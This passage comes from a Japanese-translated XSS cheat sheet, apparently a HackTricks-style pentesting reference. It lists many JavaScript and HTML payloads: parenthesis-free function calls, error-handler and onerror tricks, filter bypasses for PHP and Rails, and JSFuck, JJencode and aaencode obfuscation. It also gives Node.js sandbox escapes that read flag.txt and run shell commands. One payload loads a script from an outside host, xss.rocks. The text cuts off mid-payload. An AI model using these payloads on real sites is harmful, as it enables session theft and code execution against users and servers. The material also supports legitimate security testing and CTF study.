eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意の関数 (alert) の呼び出し**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

攻撃者により制御される不安全なデータ（例: `location.href`）を使用している**JS code**があります。攻撃者はこれを悪用して任意のJS codeを実行できます。\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**

{{#ref}}
dom-xss.md
{{#endref}}

そこでは、**DOM vulnerabilities が何か、どのように発生するか、どのようにエクスプロイトするか**を詳しく説明しています。\
また、**該当ポストの最後**には [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) に関する説明もあるので忘れずに確認してください。

### Self-XSSの強化

### Cookie XSS

ペイロードを cookie に入れて送信することで XSS を発生させられる場合、通常は self-XSS です。しかし、もし XSS に対して脆弱なサブドメインを見つけた場合、この XSS を悪用してドメイン全体に cookie を注入し、メインドメインや他のサブドメイン（cookie XSS に脆弱なもの）で cookie XSS を誘発することができます。これには cookie tossing attack を使用します:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

この手法の優れた悪用例は [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) にあります。

### 管理者へのセッション送信

ユーザーがプロフィールを管理者と共有できる場合、プロフィール内に self XSS があり、管理者がそれを閲覧すると脆弱性が発動する可能性があります。

### セッションミラーリング

self XSS を見つけ、かつウェブページが管理者向けに **session mirroring** を提供している場合（例: クライアントがサポートを求めると、管理者がクライアントと同じセッション内容を自身のセッションから見ることができる等）、管理者にあなたの self XSS をトリガーさせてそのクッキー／セッションを盗むことが可能です。

## その他のバイパス

### WASM linear-memory template overwrite を使ったサニタイズ回避

Web アプリが Emscripten/WASM を使用していると、定数文字列（HTML フォーマットのスタブ等）は書き込み可能な linear memory に格納されます。編集パスでの未チェック memcpy のような単一の in‑WASM オーバーフローが隣接構造を破壊し、これらの定数への書き込みをリダイレクトすることがあります。"<article><p>%.*s</p></article>" のようなテンプレートを "<img src=1 onerror=%.*s>" に上書きすると、サニタイズされた入力が JavaScript ハンドラの値になり、レンダリング時に即座に DOM XSS を引き起こします。

エクスプロイトのワークフロー、DevTools のメモリヘルパー、対策をまとめた専用ページを確認してください:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### 正規化された Unicode

リフレクトされる値がサーバー（またはクライアント側）で **unicode normalized** されているかを確認し、この機能を悪用してプロテクションをバイパスできる場合があります。[**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting)。

### PHP FILTER_VALIDATE_EMAIL フラグのバイパス
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

**RoR mass assignment** により、HTMLに引用符が挿入され、引用符による制限が回避され、タグ内に追加フィールド（onfocus）を挿入できます。\
フォーム例 ([from this report](https://hackerone.com/reports/709336)), ペイロードを送信すると:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
ペア "Key","Value" は次のようにエコーバックされます:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
すると、onfocus 属性が挿入され、XSS が発生します。

### 特殊な組み合わせ
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302レスポンスでのヘッダーインジェクションによる XSS

もし **302 Redirect response にヘッダーをインジェクトできる場合**、ブラウザに **任意の JavaScript を実行させよう** と試みることができます。これは **簡単ではありません**。なぜならモダンブラウザは HTTP レスポンスステータスコードが 302 の場合に HTTP レスポンスボディを解釈しないため、単に cross-site scripting ペイロードを置くだけでは無意味だからです。

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) では、Location header 内でいくつかのプロトコルをテストし、それらのいずれがレスポンスボディ内の XSS ペイロードをブラウザに検査・実行させることを許すかを確認する方法が説明されています。  
既知のプロトコル: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### 英字・数字・ドットのみ

もし JavaScript が実行する **callback** を英字・数字・ドットのみで指定できるなら、この挙動を悪用する方法は [**Read this section of this post**](#javascript-function) を参照してください。

### XSS に有効な `<script>` の Content-Types

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) たとえば `application/octet-stream` のような **content-type** で script をロードしようとすると、Chrome は次のエラーを出します:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Chrome が **loaded script** を実行するのを許す **Content-Type** は、const **`kSupportedJavascriptTypes`** に含まれるものだけです（参照: https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc）。
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS におけるスクリプトのタイプ

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) では、スクリプトを読み込むために指定できる type はどれですか？
```html
<script type="???"></script>
```
答えは:

- **module** (デフォルト、説明不要)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles は、HTML、CSS、JS…など複数のデータをまとめて **`.wbn`** ファイルにパッケージできる機能です。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** インポート構文の改善を可能にする
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
この挙動は[**this writeup**](https://github.com/zwade/yaca/tree/master/solution)で利用され、ライブラリをevalにリマップして悪用することでXSSを引き起こす可能性がある。

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** この機能は主にプリレンダリングによって引き起こされるいくつかの問題を解決するためのもので、動作は次のとおりです:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### XSSを引き起こすWeb Content-Types

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 次の Content-Types はすべてのブラウザで XSS を実行できます:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? リストにはないが CTF で見た気がする)
- application/rss+xml (off)
- application/atom+xml (off)

他のブラウザでは、他の **`Content-Types`** を使って任意の JS を実行できる場合があります。詳しくは: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

ページが text/xml コンテンツタイプを返している場合、名前空間を指定して任意の JS を実行することが可能です:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊な置換パターン

次のような **`"some {{template}} data".replace("{{template}}", <user_input>)`** が使われている場合、攻撃者は [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) を利用して一部の保護を回避しようとする可能性があります: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

例えば [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) では、これを利用してスクリプト内のJSON文字列をエスケープし、任意のコードを実行しました。

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

使用できる文字が限られている場合は、XSJailの問題に対する以下の他の有効な解法を確認してください:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
信頼できないコードを実行する前に**すべてが undefined**である場合（[**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)のように）、任意の信頼できないコードの実行を悪用するために "何もないところから" 有用なオブジェクトを生成することが可能です：

- import()を使用する
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- `require` に間接的にアクセスする

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) によれば、Node.js はモジュールを関数でラップしており、次のようになります:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
したがって、そのモジュールから**別の関数を呼び出す**ことができれば、その関数内で `arguments.callee.caller.arguments[1]` を使って **`require`** にアクセスできます:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
前の例と同様に、**use error handlers** を使ってモジュールの **wrapper** にアクセスし、**`require`** 関数を取得できます:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **1ページでの異なる obfuscations:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- より高度な JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
